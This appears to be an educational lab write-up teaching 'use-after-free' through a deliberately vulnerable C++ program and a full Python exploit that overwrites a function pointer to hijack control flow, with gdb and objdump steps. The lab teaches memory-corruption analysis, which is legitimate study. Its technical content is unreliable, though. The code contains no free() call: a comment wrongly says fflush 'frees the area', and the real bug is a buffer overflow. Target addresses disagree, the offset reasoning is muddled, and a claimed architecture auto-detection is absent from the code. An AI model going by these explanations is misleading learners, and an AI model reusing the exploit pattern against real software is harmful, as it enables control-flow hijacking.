# CyberLabs: Use-After-Free (UAF) Vulnerability Laboratory

**Module Code:** CL-MEM-002

**Level:** Intermediate / Advanced

**Topic:** Memory Corruption Vulnerabilities

## Laboratory Purpose

This laboratory, prepared for the CyberLabs education platform, addresses one of the frequently encountered memory corruption vulnerabilities: **Use-After-Free (UAF)**. Participants are expected to gain the following competencies by the end of this laboratory:

  - Understanding the basic causes and lifecycle of UAF vulnerability.
  - Practically observing how a pointer accesses memory after being freed.
  - Applying basic static analysis and compilation processes using tools like `g++` and `objdump`.
  - Developing a basic exploit (exploitation code) in a controlled laboratory environment to change the program's control flow.

## Scenario
The laboratory scenario consists of two main components:

1.  `zafiyetli_sunucu.cpp`: Target application written in C++ that intentionally contains a UAF vulnerability.
2.  `exploit.py`: Python exploitation code that triggers the vulnerability in the vulnerable application, changes the program's flow, and calls a predetermined function.

## Disclaimer / Legal Warning

The information provided in this blog post is intended for educational and informational purposes only. It is not intended to encourage or promote any illegal or unethical activities, including hacking, cyberattacks, or any form of unauthorized access to computer systems, networks, or data.

The information provided in this blog post is for educational and informational purposes only. It does not intend to encourage or promote any illegal or unethical activities, including hacking, cyberattacks, or any form of unauthorized access to computer systems, networks, or data.

This laboratory content is designed entirely for the **CyberLabs educational environment**. The purpose of the information and codes here is to help cybersecurity experts better understand defense mechanisms and develop vulnerability analysis capabilities. The use of these materials outside the CyberLabs environment or for illegal purposes is strictly prohibited, and all responsibility belongs to the user.

## What is Use-After-Free Vulnerability?

Use-After-Free (UAF), in Turkish **"Use After Free"**, is a critical memory management security vulnerability that occurs when a program tries to access or use a memory address that is no longer valid after returning (freeing) a dynamically allocated memory region to the system.

This access is usually made through a **"dangling pointer"** that should no longer point to that address. Attackers can exploit this situation by writing the address of their malicious code to the freed memory area and ensuring that the program later follows this invalid pointer and executes that address.

A successful exploitation can lead to program crashes, sensitive data leakage, or complete system takeover.

## Installation and Execution Steps

**Example Code Analysis**

Now let's write an example code step by step and exploit the vulnerability. First, let's write our vulnerable program:

```cpp
#include <cstdio>
#include <cstdlib>

// Function to be injected for exploitation
void basariMesaji() {
    printf(">>> CONTROL TAKEN! Vulnerability successfully exploited.\n");
}

// Data structure (struct) that contains the vulnerability.
typedef struct {
    char kullaniciVerisi[100]; // 100-byte buffer area to be used to receive data from outside.
    void (*islemYapPtr)(); // Function pointer to be overwritten to change program flow.
} Session;

// Starting point of the program.
int main() {
    // Prints a message indicating that the program has started to the screen (standard error stream).
    fprintf(stderr, "[VICTIM] Program started.\n");
    Session* ses = (Session*)malloc(sizeof(Session)); // Allocates space for 'Session' structure in heap area.
    fflush(stdout);  // Frees the area
    fread(ses->kullaniciVerisi, 1, 108, stdin); // Writes kullaniciVerisi value over islemYapPtr
    if (ses && ses->islemYapPtr) {
        // If exploitation is successful, this command executes the 'basariMesaji' function.
        ses->islemYapPtr();
    }
    return 0;
}
```

Here, after creating the **"islemYapPtr"** value, the **"kullaniciVerisi"** value is written over it. Actually, the basic logic of the vulnerability can be understood here. The goal is to call a different function by writing a new value in place of the code deleted from memory.

If you still don't understand, you can also look at a simpler code. Also, you can calculate **PADDING_SIZE** for the other code with this code. **You don't need to use the "-no-pie" tag to compile this code.**

```cpp
#include <cstdio>
#include <cstddef>

typedef struct {
    char kullaniciVerisi[100];
    void (*islemYapPtr)();
} Session;

int main() {
    printf("Size (sizeof(Session)): %zu bytes\n", sizeof(Session));
    printf("Starting position of islemYapPtr (offsetof): %zu bytes\n", offsetof(Session, islemYapPtr));
    return 0;
}
```

*PADDING SIZE calculation (104 bytes)*

Now we can compile the code. To compile the code, we must use **"-no-pie"**. The reason we use this tag is that we need to disable the **"Position-Independent Executable"** feature. Thus, we disable the ASLR feature and ensure that values are written to predictable areas.

The reason we use **"-g"** is that we will do debugging with a program called GDB in the next stages, so that variables are visible during debugging.

```bash
g++ -o zafiyetli_sunucu zafiyetli_sunucu.cpp -no-pie -g
```

*If no-pie is not used*

*If no-pie is used*

**Friends, it is very important to understand up to this point. If you don't understand, read the codes again. You cannot understand the continuation without understanding this code. From this point on, we start the exploitation phase of the vulnerability.**

### Exploit Development Phase

First, we need to find the memory location of the **"basariMesaji"** function statically. For this, we will use the following command:

```bash
objdump -t ./zafiyetli_sunucu | grep basariMesaji
```
After running the following command, let's examine the output together:

*Memory Address Detection*

Looking at the output, we statically detect that the relevant variable is stored at memory address **"0x401166"** in the **".text"** area. So this value becomes empty at some point and is checked again even though it is empty.

Now we need to detect the padding size of the relevant vulnerable variable so that we can fill it with that much data. For this, you can solve it easily with this code. You can take the **"offsetof"** value as basis. I will explain the long and technical way.

```cpp
#include <cstdio>
#include <cstddef>

typedef struct {
    char kullaniciVerisi[100];
    void (*islemYapPtr)();
} Session;

int main() {
    printf("Size (sizeof(Session)): %zu bytes\n", sizeof(Session));
    printf("Starting position of islemYapPtr (offsetof): %zu bytes\n", offsetof(Session, islemYapPtr));
    return 0;
}
```

Now we start our investigation with GDB. For this, I use the command **"gdb zafiyetli_sunucu"**.

Then we display our codes with the **"list main"** command:

*Displaying Codes with GDB*

After displaying the codes, we need to create a payload for the heap area we calculated earlier. At this stage, we can create the value with a Python script like this.

```python
import struct
PADDING_SIZE = 100 # Temporary value
TARGET_ADDRESS = 0x401176 # Calculated Heap Value
payload = b'A' * PADDING_SIZE + struct.pack("<Q", TARGET_ADDRESS)
with open("payload.bin", "wb") as f: f.write(payload)
print("'payload.bin' created.")
```

Then we return to GDB and write "break 22". This way the code will stop at line 22.

*Breakpoint Assignment*

We slowly increase the PADDING_SIZE value and start testing with the "run < payload.bin" command on GDB.

*Injection Attempt - 1*

At this stage, we see that we are about to pass the if loop. Now, to see if our values have been formed, we first run the "print ses" command to find the location of the value. We note the value that comes out here.

*Finding Variable Location*

Now we are at the most important stage. We run the command in the form "x/16gx VALUE". The meaning of this command is to **"examine memory (x), show 16 units of value (/16), show in giant word format (each 8 bits, g) and show in hex (x)"**.

*Vulnerability Detection*

**BINGO!** We have successfully detected the vulnerability. Now we move on to calculation. According to these values, our starting variable is **0x4052a0**. **If you look carefully at line 0x405300, you can see the value 0x00401176.** When we examine this value,

  - 0x405300 -> 41
  - 0x405301 -> 41
  - 0x405302 -> 41
  - 0x405303 -> 41
  - 0x405304 -> 76
  - 0x405305 -> 11
  - 0x405306 -> 40
  - 0x405307 -> 00

So actually the **0x405304 (large value)** value is **0x4052a0** when we subtract the values from each other, we get the hex value **0x000064**. When we calculate, **6*16+4*1=100** means that **the islemYapPtr function pointer starts exactly 100 bytes after the beginning of the kullaniciVerisi buffer area.** However, since 100 does not divide 8 exactly, the next closest value, 104, should be our PADDING_SIZE value.

Now we start writing our exploitation code with all this information. I use Python language for the exploitation code. You can write in different languages.

Let's determine our static variables:

```python
# Name of the vulnerable program
VICTIM_PROGRAM = "./zafiyetli_sunucu"

# Static address we found with objdump.
HARDCODED_ADDRESS = 0x401166
# Our padding size
PADDING_SIZE = 104
```

Then we write the code that starts the program:

```python
 try:
        p = subprocess.Popen([VICTIM_PROGRAM], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except FileNotFoundError:
        print(f"[!] ERROR: '{VICTIM_PROGRAM}' not found. Did you compile the C++ code with -no-pie?")
        sys.exit(1)
```

Now we write the stage that prepares our payloads:

```python
padding = b'A' * PADDING_SIZE
overwrite_address = struct.pack("<Q", HARDCODED_ADDRESS)
payload = padding + overwrite_address
print(f"[*] Payload created as {len(payload)} bytes.")
print("[*] Sending payload to victim program...")
```

Then we write the stage where we check the outputs of the function we injected:

```python
 stdout_output_bytes, stderr_output_bytes = p.communicate(input=payload)
    
    stdout_output = stdout_output_bytes.decode('utf-8', errors='ignore')
    stderr_output = stderr_output_bytes.decode('utf-8', errors='ignore')

    print("\n--- Output from Victim Program ---")
    print(stdout_output)
    print("--- Error Output from Victim (if any) ---")
    print(stderr_output)
    print("--- Exploit Completed ---")
    
    if "CONTROL TAKEN" in stdout_output:
        print("\n[+] Vulnerability successfully exploited!")
    else:
        print("\n[-] Exploitation failed.")
```

And when we run our exploitation code, we see that we have successfully injected the function.

*Successful Exploitation*

### Complete Exploitation Code

```python
import struct
import subprocess
import sys

# Name of the vulnerable program
VICTIM_PROGRAM = "./zafiyetli_sunucu"

# Static address we found in Step 1 that will NEVER CHANGE.
# You should write the address you found on your own system here!
HARDCODED_ADDRESS = 0x401166

PADDING_SIZE = 104

def main():
    print("--- [ATTACKER] Python Exploit (with Static Address) Started ---")
    
    try:
        p = subprocess.Popen([VICTIM_PROGRAM], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except FileNotFoundError:
        print(f"[!] ERROR: '{VICTIM_PROGRAM}' not found. Did you compile the C++ code with -no-pie?")
        sys.exit(1)
        
    print(f"[*] Target address is known statically: {hex(HARDCODED_ADDRESS)}")
    
    # Create payload with FIXED address
    padding = b'A' * PADDING_SIZE
    overwrite_address = struct.pack("<Q", HARDCODED_ADDRESS)
    payload = padding + overwrite_address
    
    print(f"[*] Payload created as {len(payload)} bytes.")
    print("[*] Sending payload to victim program...")
    
    stdout_output_bytes, stderr_output_bytes = p.communicate(input=payload)
    
    stdout_output = stdout_output_bytes.decode('utf-8', errors='ignore')
    stderr_output = stderr_output_bytes.decode('utf-8', errors='ignore')

    print("\n--- Output from Victim Program ---")
    print(stdout_output)
    print("--- Error Output from Victim (if any) ---")
    print(stderr_output)
    print("--- Exploit Completed ---")
    
    if "CONTROL TAKEN" in stdout_output:
        print("\n[+] Vulnerability successfully exploited!")
    else:
        print("\n[-] Exploitation failed.")

if __name__ == "__main__":
    main()
```

## Linux Compatibility

This lab is designed to work on both Linux and macOS systems:

### Compilation for Linux
```bash
# Special compilation script for Linux
./compile_linux.sh

# Or manual compilation
g++ -o compiled/zafiyetli_sunucu source_codes/zafiyetli_sunucu.cpp -no-pie -g -static-libgcc -static-libstdc++
```

### Requirements
- **Linux:** `g++`, `build-essential`, `libc6-dev`
- **macOS:** `g++` (Xcode Command Line Tools)
- **Python:** `python3`, `pwntools`

### Testing
```bash
# Run all tests
./test_lab.sh

# Run exploit
python3 source_codes/exploit.py
```

The exploit automatically detects system architecture (32-bit/64-bit) and uses the appropriate packing function.
